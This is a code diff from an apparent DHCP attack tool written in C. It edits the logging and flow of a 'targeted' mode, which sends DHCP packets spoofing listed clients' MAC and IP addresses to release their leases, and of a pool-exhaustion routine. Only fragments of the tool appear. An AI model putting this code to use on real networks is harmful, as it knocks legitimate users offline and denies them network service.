@@ -279,8 +279,12 @@ int main(int argc, char *argv[])
 
     if(mode)
     {
+        printf("Attack Mode: Targeted\n");
         release_target(fp, p, sock, *iface_ip, ifindex);
-        return 0;
+    }
+    else
+    {
+        printf("Attack Mode: Normal\n");
     }
  
     if(!num_of_loops)
@@ -356,6 +360,8 @@ void exaust_pool(int sock, int ifindex, Packet *p, Exausted **head, int num, int
     int offset = 0;
     int count = 0;
     bool success = false;
+
+    printf("Exausting IP(s)...\n");
 
     for(int i = 0; i < num_of_loops && keep_running; i++)
     {
@@ -492,9 +498,11 @@ void exaust_pool(int sock, int ifindex, Packet *p, Exausted **head, int num, int
                     return;
                 }
                 count++;
-                printf("\033[2J\033[H");
+                /* printf("\033[2J\033[H");
                 fflush(stdout);
-                printf("[%d] IP addresses in subnet --- Exausted [%d/%d]\n", num, count, num);
+                printf("[%d] IP addresses in subnet --- Exausted [%d/%d]\n", num, count, num); */
+
+                printf("Exausted IP [%s]\n", offered_ip);
 
                 memcpy(&new_node->ip, &response_packet->dhcp.ip_addr, sizeof(response_packet->dhcp.ip_addr));
                 memcpy(&new_node->mac, &p->eth.src_mac, sizeof(p->eth.src_mac));
@@ -615,29 +623,7 @@ void release_target(FILE *fp, Packet *p, int sock, uint8_t iface_ip, int ifindex
     }
     fclose(fp);
 
-    printf("Loaded %d IP(s) from file\n", row_count);
-
-    /* Targets *current = head;
-
-    while(current != NULL)
-    {
-        Targets *tmp = current;
-        char ip_str[INET_ADDRSTRLEN];
-        char mac_str[18];
-        inet_ntop(AF_INET, current->ip_addr, ip_str, INET_ADDRSTRLEN);
-        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X", 
-        current->mac[0],
-        current->mac[1],
-        current->mac[2],
-        current->mac[3],
-        current->mac[4],
-        current->mac[5]
-        );
-        printf("%s with mac %s\n", ip_str, mac_str);
-        current = current->next;
-        free(tmp);
-    } */
-
+    printf("Releasing %d IP(s)...\n", row_count);
 
     // clear dhcp options
     memset(p->dhcp.options, 0, sizeof(p->dhcp.options));
@@ -655,7 +641,6 @@ void release_target(FILE *fp, Packet *p, int sock, uint8_t iface_ip, int ifindex
     addr.sll_halen = 6;
     memset(addr.sll_addr, 0xff, 6);
 
-    printf("Sending DHCPDISCOVER to discover DHCP host\n");
     int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&addr, sizeof(addr));
 
     if(bytes_sent < 0)
@@ -702,7 +687,6 @@ void release_target(FILE *fp, Packet *p, int sock, uint8_t iface_ip, int ifindex
             {
                 memcpy(dhcp_host, &r->dhcp.options[i+2], 4);
                 inet_ntop(AF_INET, dhcp_host, dhcp_str, INET_ADDRSTRLEN);
-                printf("%s\n", dhcp_str);
                 break;
             }
 
@@ -717,6 +701,7 @@ void release_target(FILE *fp, Packet *p, int sock, uint8_t iface_ip, int ifindex
 
     while(current != NULL)
     {
+        char ip_str[INET_ADDRSTRLEN];
         p->dhcp.opcode = 1;
         memcpy(&p->dhcp.client_mac, &current->mac, sizeof(current->mac));
         memcpy(&p->dhcp.client_ip, &current->ip_addr, sizeof(current->ip_addr));
@@ -744,24 +729,16 @@ void release_target(FILE *fp, Packet *p, int sock, uint8_t iface_ip, int ifindex
 
         calc_ip_checksum(p);
 
-
-        struct sockaddr_in server_addr;
-        memset(&server_addr, 0, sizeof(server_addr));
-        server_addr.sin_family = AF_INET;
-        server_addr.sin_port = htons(67);
-        memcpy(&server_addr.sin_addr, dhcp_host, 4);
-
         int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&addr, sizeof(addr));
 
         if(bytes_sent < 0)
         {
-            perror("sendto2");
+            perror("sendto");
             return;
         }
+        inet_ntop(AF_INET, current->ip_addr, ip_str, INET_ADDRSTRLEN);
         current = current->next;
+        printf("Released [%s]\n", ip_str);
     }
-
-    printf("done\n");
-
-
+    printf("Release complete, now running exaustion...\n");
 }
